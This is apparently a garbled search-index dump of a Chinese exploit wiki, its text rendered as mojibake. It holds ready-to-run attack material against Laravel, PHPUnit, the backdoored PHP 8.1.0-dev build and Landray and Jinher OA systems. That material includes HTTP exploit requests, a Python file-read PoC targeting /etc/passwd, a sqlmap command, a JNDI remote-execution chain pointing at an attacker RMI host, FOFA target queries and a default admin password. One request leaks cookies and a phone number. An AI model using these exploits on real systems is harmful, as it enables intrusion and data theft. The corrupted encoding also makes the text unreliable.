ç¬¬ä¸€æ¬¡è¿æ¥ä¼šæ”¶åˆ°å‘½ä»¤RETR /123\\r\\nï¼Œç¬¬äºŒæ¬¡è¿æ¥ä¼šæ”¶åˆ°STOR /123\\r\\n if count == 1: conn.send(b\"125 \\n\") # å‘Šè¯‰å®¢æˆ·ç«¯å¯ä»¥å¼€å§‹æ•°æ®é“¾æ¥äº† # æ–°å»ºä¸€ä¸ªsocketç»™æœåŠ¡ç«¯è¿”å›æˆ‘ä»¬çš„payload print(\"å»ºç«‹è¿æ¥!\") conn2, address2 = sk2.accept() conn2.send(payload) conn2.close() print(\"æ–­å¼€è¿æ¥!\") else: conn.send(b\"150 \\n\") print(conn.recv(20)) exit() # ç¬¬ä¸€æ¬¡è¿æ¥æ˜¯ä¸‹è½½æ–‡ä»¶ï¼Œéœ€è¦å‘Šè¯‰å®¢æˆ·ç«¯ä¸‹è½½å·²ç»ç»“æŸ if count == 1: conn.send(b\"226 \\n\") conn.close() count += 1 å‚è€ƒæ–‡ç«  ç±³æ–¯ç‰¹å›¢é˜Ÿ|æ¼æ´åˆ†æ | Laravel Debugé¡µé¢RCEï¼ˆCVE-2021-3129ï¼‰åˆ†æå¤ç° é™Œé™Œå®‰å…¨|FTPåˆ©ç”¨|LARAVELçš„é‚£ä¸ªRCEæœ€æœ‰è¶£çš„ç‚¹åœ¨è¿™é‡Œ åŸä½œè€…æ¼æ´åˆ†æ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/jQuery/":{"url":"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/jQuery/","title":"jQuery","keywords":"","body":"jQuery jQuery XSSæ¼æ´ CVE-2020-11022/11023 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-15 20:47:27 "},"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/jQuery/jQuery XSSæ¼æ´ CVE-2020-11022 11023.html":{"url":"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/jQuery/jQuery XSSæ¼æ´ CVE-2020-11022 11023.html","title":"jQuery XSSæ¼æ´ CVE-2020-11022/11023","keywords":"","body":"jQuery XSSæ¼æ´ CVE-2020-11022/11023 æ¼æ´æè¿° æ®NVDæè¿°ï¼šåœ¨å¤§äºæˆ–ç­‰äº1.2ä¸”åœ¨3.5.0ä¹‹å‰çš„jQueryç‰ˆæœ¬ä¸­ï¼Œå³ä½¿æ‰§è¡Œäº†æ¶ˆæ¯’ï¼ˆsanitizeï¼‰å¤„ç†ï¼Œä¹Ÿä»ä¼šæ‰§è¡Œå°†æ¥è‡ªä¸å—ä¿¡ä»»æ¥æºçš„HTMLä¼ é€’ç»™jQueryçš„DOMæ“ä½œæ–¹æ³•ï¼ˆå³html()ã€.append()ç­‰ï¼‰ï¼Œä»è€Œå¯¼è‡´xssæ¼æ´ã€‚ æ¼æ´å½±å“ [!NOTE] 3.5.0 > jQuery >= 1.2 æ¼æ´å¤ç° åœ¨çº¿å¤ç°åœ°å€ï¼Œ å¯ä»¥é€šè¿‡è§‚å¯Ÿå˜åŒ–äº†è§£æ¼æ´ https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html PoC 1. PoC 2. (Only jQuery 3.x affected) \"> PoC 3. PoC 1å’ŒPoC 2å…·æœ‰ç›¸åŒçš„æ ¹æœ¬åŸå› ã€‚åœ¨ä¸­.html()ï¼Œä½œä¸ºå‚æ•°ä¼ é€’çš„HTMLå­—ç¬¦ä¸²å°†ä¼ é€’åˆ° $ .htmlPrefilterï¼ˆï¼‰æ–¹æ³•ã€‚è¯¥htmlPrefilterå¤„ç†ç”¨äºæ›¿æ¢è‡ªé—­åˆæ ‡ç­¾ç­‰è¿›è¡Œåˆ°ï¼Œé€šè¿‡ä½¿ç”¨ä»¥ä¸‹æ­£åˆ™è¡¨è¾¾å¼ï¼š**`` rxhtmlTag = / ] *ï¼‰\\ /> / gi [ã€‚ ..] htmlPrefilterï¼šfunctionï¼ˆhtmlï¼‰{ return html.replaceï¼ˆrxhtmlTagï¼Œâ€œ â€ï¼‰; } å¦‚æœPoC 1çš„HTMLé€šè¿‡æ­¤æ›¿æ¢ï¼Œåˆ™è¾“å‡ºå°†æ˜¯ï¼š > $ .htmlPrefilterï¼ˆ' 'ï¼‰ â€œ é»„è‰²éƒ¨åˆ†æ˜¯æ›¿æ¢çš„å­—ç¬¦ä¸²ã€‚ç”±äºæ­¤æ›¿æ¢ï¼Œæ ·å¼å…ƒç´ å†…éƒ¨è¢«æ›¿æ¢ä¸ºï¼Œç»“æœæ˜¯ï¼Œä¹‹åçš„å­—ç¬¦ä¸²ä»æ ·å¼å…ƒç´ ä¸­è¢«è¸¢å‡ºã€‚ä¹‹åï¼Œ.html()å°†æ›¿æ¢çš„HTMLåˆ†é…ç»™innerHTMLã€‚åœ¨è¿™é‡Œï¼Œå­—ç¬¦ä¸²å˜æˆäº†å®é™…çš„imgæ ‡ç­¾ï¼Œå¹¶è§¦å‘äº†onerroräº‹ä»¶ã€‚ é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œä¸Šè¿°æ­£åˆ™è¡¨è¾¾å¼åœ¨3.xä¹‹å‰çš„jQueryä¸­ä½¿ç”¨ã€‚ä»3.xå¼€å§‹ï¼Œä½¿ç”¨äº†å¦ä¸€ä¸ªç»è¿‡ç¨åŠ ä¿®æ”¹çš„æ­£åˆ™è¡¨è¾¾å¼ rxhtmlTag = / \\ x20 \\ t \\ r \\ n \\ f] *ï¼‰[^>] *ï¼‰\\ /> / gi æ­¤æ›´æ”¹å¼•å…¥äº†å¦ä¸€ä¸ªXSSå‘é‡ï¼Œè¯¥å‘é‡å¯èƒ½ä»…ç”±æ›´å¤šåŸºæœ¬å…ƒç´ å’Œå±æ€§å¯¼è‡´XSSã€‚é€šè¿‡æ­¤æ›´æ”¹å¼•å…¥äº†PoC 2çš„å‘é‡ã€‚å®ƒä»…é€‚ç”¨äºjQuery3.xã€‚ > $ .htmlPrefilterï¼ˆ' â€>'ï¼‰ â€>â€œ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå±æ€§å€¼ä¸Šçš„ img å­—ç¬¦ä¸²è¢«è¸¢å‡ºå¹¶å‘ç”ŸXSSã€‚ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/PHPUnit/":{"url":"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/PHPUnit/","title":"PHPUnit","keywords":"","body":"PHPUnit PHPUnit eval-stdin.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2017-9841 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-09 11:56:28 "},"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/PHPUnit/PHPUnit eval-stdin.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2017-9841.html":{"url":"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/PHPUnit/PHPUnit eval-stdin.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2017-9841.html","title":"PHPUnit eval-stdin.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2017-9841","keywords":"","body":"PHPUnit eval-stdin.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2017-9841 æ¼æ´æè¿° PHPUnit5.6.3ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œå­˜åœ¨ä¸€å¤„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œåˆ©ç”¨æ¼æ´å¯ä»¥è·å–æœåŠ¡å™¨æ•æ„Ÿä¿¡æ¯åŠæƒé™ã€‚ æ¼æ´å½±å“ [!NOTE] PHPUnit æ¼æ´å¤ç° æ¼æ´ä½äº /phpunit/src/Util/PHP/eval-stdin.php å…¶ä¸­å…³é”®ä»£ç ä¸º: eval('?>'.file_get_contents('php://input')); å‘é€å¦‚ä¸‹è¯·æ±‚åŒ…æ‰§è¡ŒPHPä»£ç  POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1 Host: Content-Length: 21 Accept-Encoding: gzip PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/å¼€å‘è¯­è¨€æ¼æ´/":{"url":"PeiQi_Wiki/å¼€å‘è¯­è¨€æ¼æ´/","title":"å¼€å‘è¯­è¨€æ¼æ´","keywords":"","body":"å¼€å‘è¯­è¨€æ¼æ´ğŸ­ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 19:49:08 "},"PeiQi_Wiki/å¼€å‘è¯­è¨€æ¼æ´/PHP/":{"url":"PeiQi_Wiki/å¼€å‘è¯­è¨€æ¼æ´/PHP/","title":"PHP","keywords":"","body":"PHP PHP zerodiumåé—¨æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-03 12:49:56 "},"PeiQi_Wiki/å¼€å‘è¯­è¨€æ¼æ´/PHP/PHP zerodiumåé—¨æ¼æ´.html":{"url":"PeiQi_Wiki/å¼€å‘è¯­è¨€æ¼æ´/PHP/PHP zerodiumåé—¨æ¼æ´.html","title":"PHP zerodiumåé—¨æ¼æ´","keywords":"","body":"PHP zerodiumåé—¨æ¼æ´ æ¼æ´æè¿° PHPå¼€å‘å·¥ç¨‹å¸ˆJake Birchallåœ¨å¯¹å…¶ä¸­ä¸€ä¸ªæ¶æ„COMMITçš„åˆ†æè¿‡ç¨‹ä¸­å‘ç°ï¼Œåœ¨ä»£ç ä¸­æ³¨å…¥çš„åé—¨æ˜¯æ¥è‡ªä¸€ä¸ªPHPä»£ç è¢«åŠ«æŒçš„ç½‘ç«™ä¸Šï¼Œå¹¶ä¸”é‡‡ç”¨äº†è¿œç¨‹ä»£ç æ‰§è¡Œçš„æ“ä½œï¼Œå¹¶ä¸”æ”»å‡»è€…ç›—ç”¨äº†PHPå¼€å‘äººå‘˜çš„åä¹‰æ¥æäº¤æ­¤COMMITã€‚ ç›®å‰ä¸ºæ­¢PHPå®˜æ–¹å¹¶æœªå°±è¯¥äº‹ä»¶è¿›è¡Œæ›´å¤šæŠ«éœ²ï¼Œè¡¨ç¤ºæ­¤æ¬¡æœåŠ¡å™¨è¢«é»‘çš„å…·ä½“ç»†èŠ‚ä»åœ¨è°ƒæŸ¥å½“ä¸­ã€‚ç”±äºæ­¤äº‹ä»¶çš„å½±å“ï¼ŒPHPçš„å®˜æ–¹ä»£ç åº“å·²ç»è¢«ç»´æŠ¤äººå‘˜è¿ç§»è‡³GitHubå¹³å°ï¼Œä¹‹åçš„ç›¸å…³ä»£ç æ›´æ–°ã€ä¿®æ”¹å°†ä¼šéƒ½åœ¨GitHubä¸Šè¿›è¡Œã€‚ æ¼æ´å½±å“ [!NOTE] PHP 8.1.0-dev FOFA [!NOTE] \"PHP/8.1.0-dev\" æ¼æ´å¤ç° åé—¨ä¸ºæ·»åŠ è¯·æ±‚å¤´ User-Agentt: zerodiumsystem('id'); [!NOTE] æ˜¯ User-Agentt ä¸æ˜¯ User-Agent åå¼¹shell PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/","title":"OAäº§å“æ¼æ´","keywords":"","body":"OAäº§å“æ¼æ´ğŸ¶ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 19:46:30 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è“å‡ŒOA/":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è“å‡ŒOA/","title":"è“å‡ŒOA","keywords":"","body":"è“å‡ŒOA è“å‡ŒOA EKP åå°SQLæ³¨å…¥æ¼æ´ CNVD-2021-01363 è“å‡ŒOA ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ è“å‡ŒOA custom.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ è“å‡ŒOA SSRF+JNDIè¿œç¨‹å‘½ä»¤æ‰§è¡Œ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-08 16:04:19 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è“å‡ŒOA/è“å‡ŒOA EKP åå°SQLæ³¨å…¥æ¼æ´ CNVD-2021-01363.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è“å‡ŒOA/è“å‡ŒOA EKP åå°SQLæ³¨å…¥æ¼æ´ CNVD-2021-01363.html","title":"è“å‡ŒOA EKP åå°SQLæ³¨å…¥æ¼æ´ CNVD-2021-01363","keywords":"","body":"è“å‡ŒOA EKP åå°SQLæ³¨å…¥æ¼æ´ CNVD-2021-01363 æ¼æ´æè¿° æ·±åœ³å¸‚è“å‡Œè½¯ä»¶è‚¡ä»½æœ‰é™å…¬å¸æ•°å­—OA(EKP)å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚æ”»å‡»è€…å¯åˆ©ç”¨æ¼æ´è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯ã€‚ æ¼æ´å½±å“ [!NOTE] æµ‹è¯•æ—¶é—´ 2021-3-24 å‰ç‰ˆæœ¬ æ¼æ´å¤ç° å­˜åœ¨SQLæ³¨å…¥çš„ Urlä¸º,è¿™é‡Œæ‹¿å®˜æ–¹çš„æ¼”ç¤ºç«™ç‚¹æ¼”ç¤ºæ¼æ´è¿‡ç¨‹ https://xxx.xxx.xxx.xxx/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true å…¶ä¸­å­˜åœ¨SQLæ³¨å…¥çš„å‚æ•°ä¸º ordeby ï¼Œ æ•°æ®åŒ…å¦‚ä¸‹ GET /km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Pragma: no-cache Cache-Control: no-cache sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: cross-site Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: UM_distinctid=1785f7392888e1-02ece8c7e9a996-5771031-1fa400-1785f73928943d; landray_danyuan=null; landray_guanjianci=null; landray_sorce=baidupinzhuanwy; landray_jihua=null; JSESSIONID=232B6933CF33B5422F9D2649739D48FE; Hm_lvt_223eecc93377a093d4111a2d7ea28f51=1616509114,1616566341,1616566350; Hm_lpvt_223eecc93377a093d4111a2d7ea28f51=1616566350; Hm_lvt_d14cb406f01f8101884d7cf81981d8bb=1616509114,1616566341,1616566350; Hm_lpvt_d14cb406f01f8101884d7cf81981d8bb=1616566507; Hm_lvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616509872,1616509969,1616509973,1616566507; Hm_lpvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616566507; Hm_lvt_22f1fea4412727d23e6a998a4b46f2ab=1616509872,1616509969,1616509973,1616566507; Hm_lpvt_22f1fea4412727d23e6a998a4b46f2ab=1616566507; fd_name=%E5%95%8A%E7%9A%84%E5%93%88; fd_id=1785f817dd0f5a4beaa482646cb9a2d8; nc_phone=15572002383; j_lang=zh-CN; LtpaToken=AAECAzYwNUFEOEZBNjA1QjgxQkFsdW9stJ5e1pcW1hgQi3cOa0iEyAhdZZs=; Hm_lvt_95cec2a2f107db33ad817ed8e4a3073b=1616510026,1616566523; Hm_lpvt_95cec2a2f107db33ad817ed8e4a3073b=1616566523; add_customer=0 ä¿å­˜ä¸ºæ–‡ä»¶ï¼Œä½¿ç”¨ Sqlmap è·‘ä¸€ä¸‹æ³¨å…¥ sqlmap -r sql.txt -p orderby --dbs æ„Ÿè°¢åå• æ„Ÿè°¢ @MiaÃ²a å¸ˆå‚…çš„æŠ•ç¨¿ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è“å‡ŒOA/è“å‡ŒOA ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è“å‡ŒOA/è“å‡ŒOA ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´.html","title":"è“å‡ŒOA ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´","keywords":"","body":"è“å‡ŒOA ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ æ¼æ´æè¿° è“å‡ŒOA å­˜åœ¨ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ä¸Šä¼ æ¶æ„æ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] è“å‡ŒOA æ¼æ´å¤ç° /sys/search/sys_search_main/sysSearchMain.do?method=editParam&fdParemNames=11&FdParameters=[shellcode] æ¼æ´åœ¨/sys/search/sys_search_main/sysSearchMain.do method ä¸º editrParamã€‚å‚æ•°ä¸º FdParametersï¼Œåœ¨ com.landray.kmss.sys.search.jar ä¸­çš„ com.landray.kmss.sys.search.actions.SysSearchMainAction ç±»ã€‚method ä¸º editrParamã€‚ å¯¹ fdParemNames çš„å†…å®¹è¿›è¡Œäº†åˆ¤ç©ºã€‚å¦‚æœä¸ä¸ºç©º,è¿›å…¥ SysSearchDictUtil.getParamConditionEntry æ–¹æ³•ã€‚ ä¹Ÿæ˜¯å¯¹ fdParemNames è¿›è¡Œäº†ä¸€æ¬¡åˆ¤ç©ºã€‚ç„¶åä¼ å…¥ ObjectXML.objectXMLDecoderByString æ–¹æ³•ã€‚ å°†ä¼ å…¥è¿›æ¥çš„ string å­—ç¬¦è¿›è¡Œæ›¿æ¢ã€‚å°†å…¶è½½å…¥å­—èŠ‚æ•°ç»„ç¼“å†²åŒºï¼Œåœ¨ä¼ é€’ç»™ objectXmlDecoderã€‚ åœ¨ objectXmlDecoder ä¸­ã€‚å°±æ›´æ˜æ˜¾äº†ã€‚å…¸å‹çš„ xmlDecoder ååºåˆ—åŒ–ã€‚ æ•´ä½“æµç¨‹åªå¯¹ FdParameters çš„å†…å®¹è¿›è¡Œäº†ä¸€äº›å†…å®¹æ›¿æ¢ã€‚ å¯¼è‡´ xmlDecoder ååºåˆ—åŒ–æ¼æ´ã€‚ åˆ©ç”¨æ–¹å¼ï¼š Xmldecoder payload ç”Ÿæˆ https://github.com/mhaskar/XMLDecoder-payload-gene... PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-09 15:34:04 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è“å‡ŒOA/è“å‡ŒOA custom.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è“å‡ŒOA/è“å‡ŒOA custom.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"è“å‡ŒOA custom.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"è“å‡ŒOA custom.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° æ·±åœ³å¸‚è“å‡Œè½¯ä»¶è‚¡ä»½æœ‰é™å…¬å¸æ•°å­—OA(EKP)å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚æ”»å‡»è€…å¯åˆ©ç”¨æ¼æ´è·å–æ•æ„Ÿä¿¡æ¯ã€‚ æ¼æ´å½±å“ [!NOTE] è“å‡ŒOA FOFA [!NOTE] app=\"Landray-OAç³»ç»Ÿ\" æ¼æ´å¤ç° å‡ºç°æ¼æ´çš„æ–‡ä»¶ä¸º custom.jsp '> è¯·æ±‚åŒ…ä¸º POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 42 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip var={\"body\":{\"file\":\"file:///etc/passwd\"}} æ¼æ´POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: è“å‡ŒOA ä»»æ„æ–‡ä»¶è¯»å– \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/sys/ui/extend/varkind/custom.jsp\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'var={\"body\":{\"file\":\"file:///etc/passwd\"}}' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/sys/ui/extend/varkind/custom.jsp \\033[0m\".format(target_url)) if \"root:\" in response.text and response.status_code == 200: print(\"\\033[36m[o] æˆåŠŸè¯»å– /etc/passwd \\n[o] å“åº”ä¸º:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) # if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/è“å‡ŒOA/è“å‡ŒOA SSRF+JNDIè¿œç¨‹å‘½ä»¤æ‰§è¡Œ.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/è“å‡ŒOA/è“å‡ŒOA SSRF+JNDIè¿œç¨‹å‘½ä»¤æ‰§è¡Œ.html","title":"è“å‡ŒOA SSRF+JNDIè¿œç¨‹å‘½ä»¤æ‰§è¡Œ","keywords":"","body":"è“å‡ŒOA SSRF+JNDIè¿œç¨‹å‘½ä»¤æ‰§è¡Œ æ¼æ´æè¿° æ·±åœ³å¸‚è“å‡Œè½¯ä»¶è‚¡ä»½æœ‰é™å…¬å¸æ•°å­—OA(EKP)å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚æ”»å‡»è€…å¯åˆ©ç”¨æ¼æ´è·å–æ•æ„Ÿä¿¡æ¯ï¼Œè¯»å–é…ç½®æ–‡ä»¶å¾—åˆ°å¯†é’¥åè®¿é—® admin.do å³å¯åˆ©ç”¨ JNDIè¿œç¨‹å‘½ä»¤æ‰§è¡Œè·å–æƒé™ æ¼æ´å½±å“ [!NOTE] è“å‡ŒOA FOFA [!NOTE] app=\"Landray-OAç³»ç»Ÿ\" æ¼æ´å¤ç° åˆ©ç”¨ è“å‡ŒOA custom.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ è¯»å–é…ç½®æ–‡ä»¶ /WEB-INF/KmssConfig/admin.properties å‘é€è¯·æ±‚åŒ… POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 60 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}} è·å–passwordåï¼Œä½¿ç”¨ DESæ–¹æ³• è§£å¯†ï¼Œé»˜è®¤å¯†é’¥ä¸º kmssAdminKey è®¿é—®åå°åœ°å€ä½¿ç”¨è§£å¯†çš„å¯†ç ç™»å½• http://xxx.xxx.xxx.xxx/admin.do ä½¿ç”¨å·¥å…·æ‰§è¡Œå‘½ä»¤ https://github.com/welk1n/JNDI-Injection-Exploit java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address] è¿è¡Œå·¥å…·ç›‘å¬ç«¯å£ ping dnslogæµ‹è¯• å‘½ä»¤æ‰§è¡Œ (è“å‡ŒOA é»˜è®¤ä½¿ç”¨çš„æ˜¯ JDK 1.7) POST /admin.do HTTP/1.1 Host: Cookie: JSESSIONID=90EA764774514A566C480E9726BB3D3F; Hm_lvt_9838edd365000f753ebfdc508bf832d3=1620456866; Hm_lpvt_9838edd365000f753ebfdc508bf832d3=1620459967 Content-Length: 70 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Origin: Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 method=testDbConn&datasource=rmi://xxx.xxx.xxx.xxx:1099/cbdsdg PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é‡‘å’ŒOA/":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é‡‘å’ŒOA/","title":"é‡‘å’ŒOA","keywords":"","body":"é‡‘å’ŒOA C6 ç®¡ç†å‘˜é»˜è®¤å£ä»¤ é‡‘å’ŒOA C6 ç®¡ç†å‘˜é»˜è®¤å£ä»¤ é‡‘å’ŒOA C6 download.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ é‡‘å’ŒOA C6 åå°è¶Šæƒæ•æ„Ÿæ–‡ä»¶éå†æ¼æ´ é‡‘å’ŒOA C6 åå°è¶Šæƒæ•æ„Ÿæ–‡ä»¶éå†æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-09 09:10:51 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é‡‘å’ŒOA/é‡‘å’ŒOA C6 ç®¡ç†å‘˜é»˜è®¤å£ä»¤.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é‡‘å’ŒOA/é‡‘å’ŒOA C6 ç®¡ç†å‘˜é»˜è®¤å£ä»¤.html","title":"é‡‘å’ŒOA C6 ç®¡ç†å‘˜é»˜è®¤å£ä»¤","keywords":"","body":"é‡‘å’ŒOA C6 ç®¡ç†å‘˜é»˜è®¤å£ä»¤ æ¼æ´æè¿° é‡‘å’ŒOA C6 å­˜åœ¨ç®¡ç†å‘˜é»˜è®¤è´¦æˆ·å£ä»¤ admin/000000 ï¼Œæ”»å‡»è€…å°†ä»¥ç®¡ç†å‘˜èº«ä»½ç™»é™†åå° æ¼æ´å½±å“ [!NOTE] é‡‘å’ŒOA FOFA [!NOTE] app=\"Jinher-OA\" æ¼æ´å¤ç° è´¦å·å¯†ç  admin/000000 ç™»å½•åå° Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ JingHe_OA_C6_Default_password PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é‡‘å’ŒOA/é‡‘å’ŒOA C6 